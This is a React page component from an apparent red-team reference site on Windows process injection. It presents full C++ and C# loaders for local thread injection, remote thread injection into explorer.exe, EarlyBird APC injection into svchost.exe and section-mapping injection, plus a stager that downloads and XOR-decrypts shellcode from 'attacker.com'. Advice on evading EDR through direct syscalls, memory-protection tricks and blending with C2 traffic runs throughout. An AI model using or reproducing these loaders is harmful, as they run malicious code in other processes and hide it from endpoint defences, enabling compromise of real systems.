import React from 'react';
import ArchitectureMap from '../components/ArchitectureMap';
import TechniqueCard from '../components/TechniqueCard';

const mapColumns = [
  {
    header: 'LOCAL INJECTION',
    color: 'orange',
    nodes: [
      { title: 'CreateThread', subtitle: 'Local thread injection • C++ & C#', id: 'createthread' },
      { title: 'Downloading Shellcode', subtitle: 'HTTP fetch loaders', id: 'download' },
    ]
  },
  {
    header: 'REMOTE INJECTION',
    color: 'red',
    nodes: [
      { title: 'CreateRemoteThread', subtitle: 'Remote process injection', id: 'createremotethread' },
      { title: 'QueueUserAPC', subtitle: 'APC injection • EarlyBird', id: 'apc' },
    ]
  },
  {
    header: 'NT INJECTION',
    color: 'purple',
    nodes: [
      { title: 'NtMapViewOfSection', subtitle: 'Section-based injection', id: 'mapview' },
    ]
  },
];

const techniques = [
  {
    id: 'createthread',
    title: 'Local Thread Injection (CreateThread)',
    subtitle: 'Allocate and execute shellcode in the current process using a new thread',
    tags: ['CreateThread', 'VirtualAlloc', 'local injection', 'C++', 'C#'],
    accentColor: 'orange',
    overview: 'Local thread injection executes shellcode inside the current process — the simplest injection primitive. The key discipline is the RW → RX two-step to avoid EDR heuristics triggered by RWX allocations.',
    steps: [
      'Allocate RW memory in the current process with VirtualAlloc(NULL, size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE) — never allocate RWX directly',
      'Copy shellcode bytes into the RW buffer with memcpy (C++) or Marshal.Copy (C#)',
      'Flip the page to RX with VirtualProtect(mem, size, PAGE_EXECUTE_READ, &old) — the two-step avoids EDR RWX heuristics',
      'Create a thread at the shellcode address with CreateThread or NtCreateThreadEx',
      'Wait for execution with WaitForSingleObject, then close the handle and VirtualFree the allocation',
    ],
    commands: [
      {
        title: 'Local injection C++ and C#',
        code: `// C++ local thread injection
#include <windows.h>
unsigned char shellcode[] = { /* your shellcode here */ };

int main() {
    // 1. Allocate RW memory
    LPVOID mem = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    // 2. Copy shellcode
    memcpy(mem, shellcode, sizeof(shellcode));
    
    // 3. Change to RX (not RWX — avoids EDR heuristics)
    DWORD oldProt;
    VirtualProtect(mem, sizeof(shellcode), PAGE_EXECUTE_READ, &oldProt);
    
    // 4. Create thread and execute
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    
    // Cleanup
    VirtualFree(mem, 0, MEM_RELEASE);
    CloseHandle(hThread);
    return 0;
}

// C# equivalent using P/Invoke
byte[] shellcode = new byte[] { /* shellcode */ };
IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x04); // RW
Marshal.Copy(shellcode, 0, mem, shellcode.Length);
uint oldProt;
VirtualProtect(mem, (uint)shellcode.Length, 0x20, out oldProt); // RX
IntPtr hThread = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
WaitForSingleObject(hThread, 0xFFFFFFFF);`
      }
    ]
  },
  {
    id: 'download',
    title: 'Downloading Shellcode — Stager Loaders',
    subtitle: 'Fetch shellcode from a remote URL at runtime — keeps the initial loader clean',
    tags: ['stager', 'WinHTTP', 'URLDownloadToFile', 'C++ downloader', 'C# downloader', 'in-memory'],
    accentColor: 'orange',
    overview: 'A stager fetches shellcode at runtime from a remote URL, keeping the initial binary clean of any payload bytes. Combined with server-side encryption, the shellcode is never exposed to static analysis.',
    steps: [
      'Build a minimal loader binary that contains no shellcode — only a URL, a download function, and optional guardrails',
      'Run any environmental guardrails (domain check, IP range, uptime) before initiating the download',
      'Fetch shellcode directly into a heap/VirtualAlloc buffer using WinHTTP (C++) or WebClient.DownloadData (C#) — never write to disk',
      'Serve the shellcode from the redirector AES- or XOR-encrypted; decrypt in memory immediately after download',
      'Inject the decrypted shellcode using local CreateThread (RW → RX two-step) or any other injection primitive',
    ],
    commands: [
      {
        title: 'In-memory shellcode download and execute',
        code: `// C++ — download shellcode with WinHTTP (in-memory, no disk write)
#include <windows.h>
#include <winhttp.h>
#pragma comment(lib, "winhttp.lib")

std::vector<BYTE> DownloadShellcode(const wchar_t* host, const wchar_t* path) {
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    HINTERNET hConnect = WinHttpConnect(hSession, host, INTERNET_DEFAULT_HTTPS_PORT, 0);
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0);
    WinHttpReceiveResponse(hRequest, NULL);
    
    std::vector<BYTE> data;
    DWORD read = 0; BYTE buf[4096];
    while (WinHttpReadData(hRequest, buf, sizeof(buf), &read) && read > 0)
        data.insert(data.end(), buf, buf + read);
    
    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
    return data;
}

int main() {
    auto sc = DownloadShellcode(L"attacker.com", L"/update.bin");
    // Decrypt if needed (XOR, AES)
    // Then inject using any technique above
    return 0;
}

// C# — WebClient in-memory download
byte[] sc = new System.Net.WebClient().DownloadData("https://attacker.com/update.bin");
// XOR decrypt if encoded
for (int i = 0; i < sc.Length; i++) sc[i] ^= 0x41;
// Then: allocate, copy, protect, create thread (see CreateThread section)`
      }
    ]
  },
  {
    id: 'createremotethread',
    title: 'CreateRemoteThread — Remote Process Injection',
    subtitle: 'Inject shellcode into a remote process by creating a thread in its address space',
    tags: ['CreateRemoteThread', 'VirtualAllocEx', 'WriteProcessMemory', 'remote injection'],
    accentColor: 'red',
    overview: 'CreateRemoteThread is the classic cross-process injection primitive. It is heavily monitored by EDR — prefer NtCreateThreadEx via direct syscall for the thread creation step to avoid userland hooks.',
    steps: [
      'Select a target process whose network activity blends with C2 (browser, svchost, dllhost) — enumerate PIDs by name via Toolhelp32',
      'Open the process with minimum required rights: PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD',
      'Allocate RW memory in the remote process with VirtualAllocEx',
      'Write shellcode into the allocation with WriteProcessMemory, then flip to RX with VirtualProtectEx',
      'Create a remote thread at the shellcode address — use NtCreateThreadEx via direct syscall instead of CreateRemoteThread to bypass userland hooks',
      'Wait on the thread handle, then close both handles and free the remote allocation',
    ],
    commands: [
      {
        title: 'Remote thread injection',
        code: `// C++ CreateRemoteThread injection
#include <windows.h>
#include <tlhelp32.h>

DWORD GetPidByName(const char* name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
    if (Process32First(snap, &pe)) do {
        if (_stricmp(pe.szExeFile, name) == 0) { CloseHandle(snap); return pe.th32ProcessID; }
    } while (Process32Next(snap, &pe));
    CloseHandle(snap); return 0;
}

int main() {
    unsigned char sc[] = { /* shellcode */ };
    DWORD pid = GetPidByName("explorer.exe");
    
    // 1. Open target process
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    
    // 2. Allocate RW in target
    LPVOID remote = VirtualAllocEx(hProc, NULL, sizeof(sc), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    // 3. Write shellcode
    WriteProcessMemory(hProc, remote, sc, sizeof(sc), NULL);
    
    // 4. Change to RX
    DWORD old;
    VirtualProtectEx(hProc, remote, sizeof(sc), PAGE_EXECUTE_READ, &old);
    
    // 5. Create remote thread
    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)remote, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    
    CloseHandle(hThread); CloseHandle(hProc);
    return 0;
}`
      }
    ]
  },
  {
    id: 'apc',
    title: 'APC Injection & EarlyBird',
    subtitle: 'Queue an Asynchronous Procedure Call to execute shellcode in an alertable thread',
    tags: ['APC', 'QueueUserAPC', 'EarlyBird', 'NtQueueApcThread', 'alertable wait'],
    accentColor: 'red',
    overview: 'APC injection queues shellcode execution to run inside a target thread when it next enters an alertable wait state. EarlyBird is the cleanest variant — it injects before the process entry point, defeating hooks that initialise after startup.',
    steps: [
      'Create the target process in SUSPENDED state with CreateProcess(..., CREATE_SUSPENDED, ...)',
      'Allocate RW memory in the suspended process with VirtualAllocEx, write shellcode, flip to RX with VirtualProtectEx',
      'Queue an APC to the main thread with QueueUserAPC((PAPCFUNC)remoteAddr, pi.hThread, 0)',
      'Resume the thread with ResumeThread — the APC fires before the process entry point (EarlyBird variant)',
      'For existing processes: identify threads in alertable wait (SleepEx, WaitForSingleObjectEx) before queuing',
      'Use NtQueueApcThread via direct syscall instead of QueueUserAPC to bypass userland monitoring',
    ],
    commands: [
      {
        title: 'EarlyBird APC injection',
        code: `// EarlyBird APC injection — creates suspended process, injects, resumes
#include <windows.h>

unsigned char sc[] = { /* shellcode */ };

int main() {
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    
    // 1. Create process in SUSPENDED state
    CreateProcess(L"C:\\Windows\\System32\\svchost.exe", NULL,
        NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    
    // 2. Allocate RW in suspended process
    LPVOID mem = VirtualAllocEx(pi.hProcess, NULL, sizeof(sc),
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    // 3. Write shellcode
    WriteProcessMemory(pi.hProcess, mem, sc, sizeof(sc), NULL);
    
    // 4. Change to RX
    DWORD old;
    VirtualProtectEx(pi.hProcess, mem, sizeof(sc), PAGE_EXECUTE_READ, &old);
    
    // 5. Queue APC to main thread (before it even starts)
    QueueUserAPC((PAPCFUNC)mem, pi.hThread, 0);
    
    // 6. Resume thread — APC fires before entry point
    ResumeThread(pi.hThread);
    
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
    return 0;
}`
      }
    ]
  },
  {
    id: 'mapview',
    title: 'NtMapViewOfSection — Section-Based Injection',
    subtitle: 'Share memory between processes via a section object for stealthy shellcode delivery',
    tags: ['NtMapViewOfSection', 'NtCreateSection', 'shared memory', 'section object', 'NT injection'],
    accentColor: 'purple',
    overview: 'Section-based injection uses shared memory objects to deliver shellcode without calling WriteProcessMemory — a cross-process write that many EDRs monitor. The shellcode appears in both processes simultaneously through the shared mapping.',
    steps: [
      'Create a pagefile-backed section with NtCreateSection(PAGE_EXECUTE_READWRITE) sized to the shellcode',
      'Map the section into the current process as PAGE_READWRITE with NtMapViewOfSection to get a local write view',
      'Copy shellcode to the local mapping — data immediately appears in all mapped views (no WriteProcessMemory call)',
      'Map the same section into the target process as PAGE_EXECUTE_READ with a second NtMapViewOfSection call',
      'Create a thread in the target process at the remote view address with NtCreateThreadEx',
      'Unmap the local view with NtUnmapViewOfSection and close the section handle to clean up',
    ],
    commands: [
      {
        title: 'NtMapViewOfSection injection',
        code: `// Section-based injection using NT APIs
#include <windows.h>
#include <winternl.h>

// NT API typedefs
typedef NTSTATUS (NTAPI* pNtCreateSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef NTSTATUS (NTAPI* pNtMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
typedef NTSTATUS (NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
typedef NTSTATUS (NTAPI* pNtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

unsigned char sc[] = { /* shellcode */ };

int main() {
    HMODULE hNt = GetModuleHandleA("ntdll.dll");
    auto NtCreateSection = (pNtCreateSection)GetProcAddress(hNt, "NtCreateSection");
    auto NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(hNt, "NtMapViewOfSection");
    auto NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNt, "NtCreateThreadEx");
    
    // 1. Create RWX section (pagefile-backed)
    HANDLE hSection = NULL;
    LARGE_INTEGER size = {sizeof(sc)};
    NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &size, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    
    // 2. Map in current process (for writing)
    PVOID localView = NULL; SIZE_T viewSize = 0;
    NtMapViewOfSection(hSection, GetCurrentProcess(), &localView, 0, 0, NULL, &viewSize, 2, 0, PAGE_READWRITE);
    
    // 3. Copy shellcode to local view (appears in target too)
    memcpy(localView, sc, sizeof(sc));
    
    // 4. Map in target process (execute-only view)
    HANDLE hTarget = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    PVOID remoteView = NULL; viewSize = 0;
    NtMapViewOfSection(hSection, hTarget, &remoteView, 0, 0, NULL, &viewSize, 2, 0, PAGE_EXECUTE_READ);
    
    // 5. Execute in target
    HANDLE hThread = NULL;
    NtCreateThreadEx(&hThread, GENERIC_ALL, NULL, hTarget, remoteView, NULL, FALSE, 0, 0, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    return 0;
}`
      }
    ]
  },
];

export default function ProcessInjection() {
  const scrollTo = (id) => { const el = document.getElementById(id); if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' }); };
  return (
    <div className="space-y-12">
      <div className="text-center mb-10">
        <h1 className="text-3xl md:text-5xl font-bold font-mono tracking-tight">
          <span className="text-slate-200">Process </span><span className="text-orange-400">Injection</span>
        </h1>
        <p className="text-slate-500 font-mono text-sm mt-3">CreateThread • CreateRemoteThread • APC/EarlyBird • NtMapViewOfSection • Stagers</p>
      </div>
      <ArchitectureMap columns={mapColumns} onNodeClick={scrollTo} />
      <div className="border-t border-slate-800/50 pt-10 grid grid-cols-1 gap-4">
        {techniques.map((t) => (
          <div key={t.id} id={t.id}>
            <TechniqueCard title={t.title} subtitle={t.subtitle} tags={t.tags} accentColor={t.accentColor} overview={t.overview} steps={t.steps} commands={t.commands} />
          </div>
        ))}
      </div>
    </div>
  );
}